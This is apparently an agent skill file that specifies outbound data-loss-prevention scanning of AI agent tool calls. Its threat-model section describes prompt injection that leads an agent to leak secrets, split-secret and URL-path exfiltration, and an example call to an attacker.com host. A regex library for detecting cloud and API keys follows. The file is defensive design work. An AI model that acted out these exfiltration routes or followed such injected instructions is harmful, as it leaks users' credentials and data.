---
name: dlp
description: Outbound Data Loss Prevention for agent tool calls. Hybrid static+NLP detection (regex + Presidio/FlashText patterns), URL-path + header exfil channel scanning, chain-of-tool split-secret detection. Security Council skill, owned by dlp-scanner specialist. Pairs with `secrets-vault` (inbound creds) + `runtime-hooks/secrets-scanner` (commit-scope) + `observability` (per-call flags).
metadata:
  version: 0.3.4
---

# dlp

Secrets-vault keeps credentials from entering agent prompts. `secrets-scanner` runtime hook keeps credentials from entering commits. Neither of those covers the third leak channel: **agent tool calls that send data outbound**.

## Threat model (2026 landscape, AI-agent specific)

- **Prompt injection → HTTP body.** Attacker plants indirect injection in fetched content; agent follows it; outbound POST carries a secret.
- **MCP tool-call forwarding.** Tool arguments are verbatim forwarded to third-party MCP servers. Whatever the agent puts in `args` leaves the trust boundary.
- **Response-based exfiltration via URL path.** `GET https://attacker.com/api/<leaked_secret_here>`. Single-request DLP on the body misses this; URL path is the exfil.
- **Chain-of-tool split-secret.** Agent splits a 64-char secret across 4 calls (16 chars each). Single-request scanners miss. Correlation across calls catches.
- **Response-encoded channels.** Base64, hex, zero-width unicode, CSS tricks in outbound payloads.

Traditional DLP was designed for user-typed input to a single chatbot. The agency needs **per-call, per-chain, all-channel** scanning.

## Invariants

- **Every tool call passes through DLP before network egress.** No exceptions. Local tools (Read / Write / Grep) are exempt because they don't cross a trust boundary.
- **Scan surface: args + URL path + query string + headers + body.** Not just the body.
- **Chain-correlation window = 20 calls or 5 min, whichever ends first.** Within the window, concatenate + rescan for split-secret patterns.
- **Scan order: static first (fast), NLP second (expensive).** FlashText/regex hits short-circuit; only unmatched content goes to Presidio-style NLP.
- **Block is the default; allow is the rare case.** A DLP red is a hard deny, not a yellow warning. Override requires user-signed waiver ADR.
- **Redact at the scanner, not at the consumer.** The tool call never sees the raw secret if DLP fires. Replaced with `{{dlp-redacted:<classification>}}` token.

## Detection pattern library

**Static (FlashText / regex):**

- AWS keys: `AKIA[0-9A-Z]{16}`, `ASIA[0-9A-Z]{16}`
- GitHub: `ghp_|gho_|ghu_|ghs_|ghr_|github_pat_`
- OpenAI / Anthropic-style: `sk-[A-Za-z0-9]{20,}`, `sk-ant-[A-Za-z0-9-]{20,}`
- Stripe: `sk_live_[A-Za-z0-9]{24}`, `rk_live_[A-Za-z0-9]{24}`
- Slack: `xox[baprs]-[A-Za-z0-9-]{10,}`
- PEM: `-----BEGIN [A-Z ]+PRIVATE KEY-----`
- JWT: `eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}`
- Generic entropy: string ≥ 32 chars of [A-Za-z0-9+/=_-] with Shannon entropy ≥ 4.5 bits/char → yellow

**NLP (Presidio-style):**

- PII: SSN, credit card, phone (US / intl), email (customer-list-shaped), IBAN, passport, DOB, ICD-10
- PHI: medical record number, NPI, diagnosis codes in prose
- Custom per-project: project code names, unreleased-product names, internal URLs, client names (loaded from `_vision/dlp/<slug>-custom.jsonl`)

**Chain-correlation:**

- Window buffer per trace-ID. Concatenate recent outbound payloads. Run the static library on the concatenation.
- Split-secret candidate: string of ≥ 32 high-entropy chars that spans boundaries.

**URL-path exfil:**

- Path segments with > 24 chars high-entropy
- Query params named `data`, `payload`, `debug`, `info` with > 100-char values
- Unusual header names (non-standard `X-*` carrying high-entropy content)

## Process — per outbound call

1. Tool-call payload intercepted pre-egress.
2. Flatten: extract URL path, query string, headers (by name + value), body (JSON keys + values recursively).
3. Static pass: match against pattern library. Hit → block + log + ADR trigger. Classification tag attached (`aws-key`, `github-pat`, `pii-ssn`, `chain-split`).
4. If clean, NLP pass for PII/PHI. Hit → same block path.
5. If clean, append to chain-correlation window for this trace. Rescan window.
6. If all clean, emit to network. `dlp.flags = 0` on the call's observability span.
7. If blocked, emit `dlp.flags = 1`, return a deny result to the agent, file an ADR, notify via `notify` skill.

## Process — custom term onboarding

1. Project kickoff: Chief submits `_vision/dlp/<slug>-custom.jsonl` with project-specific redaction terms (code names, client names, internal-URL patterns).
2. Every term has `classification` (proprietary / pii / phi / pci / custom), `severity` (red / yellow), and `rationale` (one line).
3. CAO reviews at close-audit. Stale or unused terms flagged for pruning.

## Waiver flow

- A project that legitimately needs to send one of the blocked classes (e.g., a PII export to a sanctioned recipient) files a user-signed waiver ADR **before** the call.
- Waiver scopes: destination host, classification, TTL (max 24 h), max volume.
- Runtime honors waivers by adding the destination host + classification pair to an ephemeral allowlist keyed on the waiver-ADR number. Waiver expiry reverts to block.

## Gate matrix

| Condition                                      | Gate |
| ---------------------------------------------- | ---- |
| Secret match in outbound call                  | red — deny |
| PII/PHI match without waiver                   | red — deny |
| Chain-split secret candidate                   | red — deny |
| URL-path high-entropy blob without waiver      | yellow — log + alert |
| Custom proprietary term match without waiver   | red — deny |
| Waiver expired mid-call                        | red — deny + reset |

## What never happens

- A tool call bypassing DLP because "it's to a trusted host."
- Storing the raw matched secret in the DLP log. Logs store classification tag + offset + hash — not content.
- Allowing a waiver without a TTL.
- Suppressing a match to "reduce noise." Noise is the signal; tune patterns, don't suppress.
- Cross-project leak of the custom term library. Each project loads its own.
